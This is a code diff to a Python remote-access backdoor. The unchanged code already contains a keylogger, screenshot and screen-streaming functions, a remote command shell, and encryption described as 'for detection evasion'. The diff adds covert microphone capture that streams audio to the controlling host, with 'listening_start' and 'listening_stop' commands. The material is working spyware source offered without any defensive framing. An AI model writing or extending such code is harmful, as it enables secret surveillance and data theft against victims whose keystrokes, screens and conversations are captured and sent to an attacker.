@@ -10,6 +10,7 @@ import time  # For adding delays
 import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
+import pyaudio
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
 import mss.tools
 from pynput import keyboard  # For capturing keyboard input
@@ -134,6 +135,29 @@ def retrieve_keylogger_log():
     log = ""  # Clear the log after retrieving it
     return log_data
 
+  
+def stream_audio(sock, flag):
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 11025
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, input=True, frames_per_buffer=CHUNK)
+
+    try:
+        while flag['on']:
+            data = stream.read(CHUNK)
+            sock.sendall(data)
+    except:
+        pass
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        
+
 # Function to take a screenshot and send it to the remote host
 def take_screenshot():
     with mss.mss() as sct:
@@ -161,10 +185,11 @@ def stream_screen():
     except Exception as e:
         pass  # don’t crash if connection fails
 
-        
 
 # Main shell function for command execution
 def shell():
+    streaming_flag = {'on': False}
+    stream_thread = None
     while True:
         # Receive a command from the remote host
         command = reliable_recv()
@@ -195,6 +220,17 @@ def shell():
             # If the command is 'dump_keyslog', retrieve the keylogger log
             log_data = retrieve_keylogger_log()
             reliable_send(log_data)
+        elif command == 'listening_start':
+            if not streaming_flag['on']:
+                streaming_flag['on'] = True
+                stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
+                stream_thread.start()
+            reliable_send("[*] Audio stream started.")
+        elif command == 'listening_stop':
+            streaming_flag['on'] = False
+            if stream_thread:
+                stream_thread.join()
+            reliable_send("[*] Audio stream stopped.")
         elif command == 'screenshot':
             # If the command is 'screenshot', take a screenshot and send it
             screenshot_data = take_screenshot()
